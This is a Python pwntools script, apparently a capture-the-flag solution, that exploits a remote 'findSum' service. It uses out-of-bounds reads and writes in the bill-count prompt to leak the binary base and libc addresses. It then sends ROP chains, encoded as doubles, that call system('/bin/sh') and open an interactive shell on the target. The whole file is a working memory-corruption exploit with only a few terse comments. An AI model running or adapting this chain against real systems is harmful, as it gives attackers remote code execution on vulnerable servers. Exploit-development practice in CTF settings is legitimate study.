#!/usr/bin/python3

from pwn import *
import struct

def leak_at(index):
    r.sendlineafter("Enter number of bills: ", str(index))
    for i in range(index - 1):
        r.sendlineafter(": ", "0")
    r.sendlineafter(": ", "+")

def overwrite_at(index, vals=[]):
    r.sendlineafter("Enter number of bills: ", str(index + len(vals) - 1))
    for i in range(index - 1):
        r.sendlineafter(": ", "+")
    for v in vals:
        r.sendlineafter(": ", str(v))

def convert(number):
    return struct.unpack('d', p64(number))[0]

#r = process("./findSum", stdin=PTY)

libc = ELF("./libc-2.31.so")
exe = ELF("./findSum")

r = remote("pwnbank.viris.eu",5543)
# Same as remote.
# We leak binary and have binary base.
leak_at(105)
r.recvuntil("Total: ")
binary_leak = int(b"0x" + r.recvline()[5:5+11] + b"0", 16)
exe.address = binary_leak - 0x40
log.warn("Binary base @ 0x%x", exe.address)

pause()
#Overwrite to leak libc
pop_rdi = exe.address + 0x00000000000013b3

rop = []
rop.append(convert(pop_rdi))
rop.append(convert(exe.got.printf))
rop.append(convert(pop_rdi + 1)) # should be remotely
rop.append(convert(exe.plt.printf))
rop.append(convert(pop_rdi + 1)) # should be remotely
rop.append(convert(exe.sym.main))

overwrite_at(114, rop)
libc_leak = u64(r.recvuntil(b"\x7f")[-6::].ljust(8, p8(0)))
log.warn("Libc leak @ 0x%x", libc_leak)

system = libc_leak - 0xfa00
binsh = libc_leak + 0x15279a + 0x193
pause()

rop = []
rop.append(convert(pop_rdi))
rop.append(convert(libc_leak + 0x15279a + 0x193))
rop.append(convert(pop_rdi + 1)) # should be remotely
rop.append(convert(system))
rop.append(convert(pop_rdi + 1)) # should be remotely
rop.append(convert(exe.sym.main))

overwrite_at(114, rop)
# REMOTE:
# return value is sroted at position 114 remotely I suppose
# a binary leak is at 105 remotely.

r.interactive()
